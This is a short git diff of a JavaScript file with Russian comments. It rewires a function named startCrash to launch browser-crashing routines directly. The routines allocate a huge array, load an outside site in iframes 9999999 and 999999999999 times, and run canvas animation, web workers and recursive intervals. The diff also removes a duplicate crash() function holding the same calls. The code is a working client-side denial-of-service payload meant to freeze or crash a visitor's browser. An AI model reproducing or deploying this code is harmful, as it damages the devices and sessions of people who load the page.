@@ -10,7 +10,12 @@ function startCrash() {
   });
 
   // Запуск всех процессов
-  crash();
+  createLargeArray();
+  loadMultipleIframes('https://insult1ks.github.io', 9999999);
+  loadMultipleIframes('https://insult1ks.github.io', 999999999999);
+  startCanvasAnimation();
+  startWebWorkers();
+  startRecursiveIntervals();
 }
 
 function crash() {
@@ -126,14 +131,4 @@ function startRecursiveIntervals() {
       console.log(e);
     }
   }
-}
-
-// Основная функция, которая запускает все процессы
-function crash() {
-  createLargeArray();
-  loadMultipleIframes('https://insult1ks.github.io', 9999999);
-  loadMultipleIframes('https://insult1ks.github.io', 999999999999);
-  startCanvasAnimation();
-  startWebWorkers();
-  startRecursiveIntervals();
 }
